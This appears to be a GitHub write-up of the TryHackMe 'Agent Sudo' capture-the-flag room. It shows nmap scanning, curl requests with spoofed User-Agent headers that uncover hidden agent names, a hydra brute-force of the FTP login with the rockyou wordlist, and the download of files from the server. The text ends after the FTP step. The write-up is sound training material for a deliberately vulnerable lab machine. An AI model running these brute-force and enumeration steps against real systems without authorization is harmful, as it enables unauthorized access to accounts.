# Agent-sudo
  ~ https://tryhackme.com/room/agentsudoctf
* ### This is a direct walk-through to the flag. Hopping that you have given your best before referring to this write-up
* ### Assuming that your are using Attack-box or conntected to VPN. If not, do refer to [vpn_connection](https://github.com/shybu9/TRY-HACK-ME/tree/main/OPEN-VPN-CONNECTION "OPEN VPN CONNECTION")

<br>

![agent intro](https://user-images.githubusercontent.com/112984045/200202387-5bdfb2f9-7472-4800-98c3-4be0c7cf5cd6.png)
~ the IP will be given once you join the room and Start Machine succefully after connecting to OPEN-VPN
 
 ## ENUMERATION :

 * For ENUMERATION we use nmap tool which come by default in kali linux.
 <br>command : 
 ```bash
 nmap -sVC -T4 -v <IP> 
 ```
 ![agent nmap](https://user-images.githubusercontent.com/112984045/200202581-9bf78648-dd20-405c-a637-f425b7906587.png)
<br>~ we can add -v argument for more verbose output.
 
 * I usually perform one more scan by using my personal tool : [port-scanner](https://github.com/shy.bu9/portscanner)
 ![agent portscanner](https://user-images.githubusercontent.com/112984045/200202803-394383ff-08e1-482d-81fc-dcf55cb58e0c.png)<br>

  ~ I prefer this tool because of its speed as you can see it just took 858 seconds for scanning 65535 ports.Even still some improvements to be done
 
 ### ANALYSING BOTH SCANS :
 * number of OPEN PORTS : 3
 * PORT NUMBERS : 21,22,80
 * OPERATING SYSTEM : Uinux, Linux
 * service running on PORT 21 : ftp
 * service running on PORT 22 : ssh
 * service running on PORT 80 : http
 
 * As the port 80 is open lets have a look on web pages using IP
 ```bash
 http://<IP>
 ```
 
 <br>
 ![agent web](https://user-images.githubusercontent.com/112984045/200203533-42b6d9f3-8958-4fde-9071-022fc1017b4f.png)
  <br> ~ Here we have been redirected to Annoucement page as user-agent.
  
  
 * After reading hint for the next question, we came to know that this is not a browser thing and lets for curl command :
 ```bash
 curl http://<IP> -H "User-Agent : R" -L
 ```
 #### arguments
 ` -H : used for mentioning the host name .i.e User-Agent : R
 ` -L : used to follow any redirects`
 <br>
 ![agent curlR](https://user-images.githubusercontent.com/112984045/200206715-6a3b72ad-ef57-4f6f-a78b-d1c6e3903f91.png)
<br> ~ the Agent R is talking about other 25 users and hint is given as 'user agent : C'
* Lets curl once again using ' User-Agent : C'
```bash
curl http://<IP> -H "User-Agent : C" -L
```
![agent curlC](https://user-images.githubusercontent.com/112984045/200207134-58f372d6-b46b-4c24-80fc-21ec4f91eb46.png)
<br> ~ Here we came to the name of the Agent and there is one more Agent called Agent-J.

## FOOTHOLD
* Now we have the name of user, maybe we can try bruteforcing the ftp and ssh server.
* By looking at the next question, we go for FTP bruteforce first using hydra command :
```bash
hydra -l < user name that we got in curl > -P < rockyou file including its path> ftp://<IP>
```
![agent hydra](https://user-images.githubusercontent.com/112984045/200208317-9c6e5cda-379d-443e-a591-109cbaca36a2.png)
<br> ~ We have successfully got the username and password for FTP.

<br>

* After logging in to FTP, we can look for files and get them using the commands :
``` bash
ls -la
```
```bash
get cutie.png
```
```bash
get To_agentJ.txt
```
```bash
get cute-alien.jpg
```



 
